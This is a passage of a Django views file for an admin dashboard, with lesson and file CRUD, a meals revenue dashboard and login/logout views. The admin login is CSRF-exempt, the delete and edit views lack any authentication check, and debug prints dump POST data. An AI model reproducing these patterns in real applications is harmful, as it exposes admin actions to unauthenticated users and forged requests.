            messages.success(request, "File updated successfully.")
        else:
            messages.error(request, "Error updating file.")
    return redirect('content')


def delete_file(request, pk):
    file = get_object_or_404(File, pk=pk)
    file.delete()
    messages.success(request, "File deleted successfully.")
    return redirect('content')
from django.http import HttpResponse

# ---------- LESSON CRUD ----------

def add_lesson(request):
    if request.method == "POST":
        print("🟡 [DEBUG] POST data received:")
        for key, value in request.POST.items():
            print(f"➡️ {key}: {value}")
        print("🟡 [DEBUG] FILES:", request.FILES)

        try:
            title = request.POST.get('title')
            subtitle = request.POST.get('subtitle', '')
            message = request.POST.get('message')
            
            if not title or not message:
                print("🔴 Missing required fields")
                return JsonResponse({'error': 'Missing fields'}, status=400)

            Lesson.objects.create(
                title=title,
                subtitle=subtitle,
                message=message
            )
            print("✅ Lesson created successfully!")
            return JsonResponse({'success': True})

        except Exception as e:
            print("❌ [ERROR] Lesson creation failed:", e)
            return JsonResponse({'error': str(e)}, status=500)

    return JsonResponse({'error': 'Invalid method'}, status=405)
def edit_lesson(request, pk):
    lesson = get_object_or_404(Lesson, pk=pk)
    if request.method == "POST":
        form = LessonForm(request.POST, request.FILES, instance=lesson)
        if form.is_valid():
            lesson = form.save()
            
            # Handle new attachments (if any)
            if request.FILES.getlist("attachments"):
                for f in request.FILES.getlist("attachments"):
                    fobj = File.objects.create(file=f, title=f.name, description="Uploaded with lesson")
                    lesson.files.add(fobj)
            
            messages.success(request, "Lesson updated successfully.")
            return redirect("content")
        else:
            messages.error(request, "Please correct the errors below.")
    return redirect("content")


def delete_lesson(request, pk):
    lesson = get_object_or_404(Lesson, pk=pk)
    lesson.delete()
    messages.success(request, "Lesson deleted successfully.")
    return redirect("content")

#------------------------------
#content end
#------------------------------


def meals_dashboard(request):
    # range selector
    range_kind = request.GET.get("range", "monthly")
    range_kind, start_date, end_date = _daterange_for(range_kind)

    # base queryset within range by created_at
    qs = MealOrder.objects.filter(created_at__date__gte=start_date, created_at__date__lte=end_date)

    # Metrics (variant A from your first screen)
    active_clients = qs.values("customer").distinct().count()
    meals_to_prepare = MealOrder.objects.filter(
        scheduled_date=timezone.localdate(),
        status__in=["preparing", "on_delivery"]
    ).aggregate(total=Sum("items_count"))["total"] or 0
    total_revenue = qs.filter(status="delivered").aggregate(total=Sum("total_price"))["total"] or 0
    total_deliveries = qs.filter(status="delivered").count()

    # Alternative metrics (for Meals 2/3): orders, deliveries, cancelled
    all_orders = qs.count()
    deliveries = qs.filter(status="delivered").count()
    cancelled = qs.filter(status="cancelled").count()

    # Revenue series (area line)
    revenue_qs = (
        qs.filter(status="delivered")
          .annotate(day=TruncDay("created_at"))
          .values("day")
          .annotate(total=Sum("total_price"))
          .order_by("day")
    )
    labels = []
    data = []
    # Fill missing days with zeros
    d = start_date
    revenue_map = {row["day"].date(): float(row["total"]) for row in revenue_qs}
    while d <= end_date:
        labels.append(d.strftime("%b %d"))
        data.append(revenue_map.get(d, 0.0))
        d += timedelta(days=1)

    revenue_json = json.dumps({
        "labels": labels,
        "datasets": [{
            "label": "Revenue",
            "data": data,
            "borderColor": "#111827",
            "backgroundColor": "rgba(17,24,39,.08)",
            "tension": .35,
            "fill": True,
            "pointRadius": 0
        }]
    })

    # Order summary list (latest in range)
    summary = (qs
               .select_related("plan")
               .order_by("-created_at")[:8]
               .values("shipping_name", "shipping_address", "order_no", "plan__name", "status"))

    return render(request, "meals.html", {
        "range_kind": range_kind,
        "active_clients": active_clients,
        "meals_to_prepare": meals_to_prepare,
        "total_revenue": total_revenue,
        "total_deliveries": total_deliveries,

        "all_orders": all_orders,
        "deliveries": deliveries,
        "cancelled": cancelled,

        "summary": summary,
        "revenue_json": revenue_json,
        "start_date": start_date,
        "end_date": end_date,
    })

from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from django.contrib import messages
from django.views.decorators.csrf import csrf_exempt
@csrf_exempt
def admin_login(request):
      if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('dashboard_home')  # redirect to dashboard
        else:
            messages.error(request, "Invalid username or password.")

      return render(request, 'login.html')

from django.contrib.auth import logout
def logout_view(request):
    logout(request)  # Clears the session and logs out user
    return redirect('admin_login')  # Redirect to login page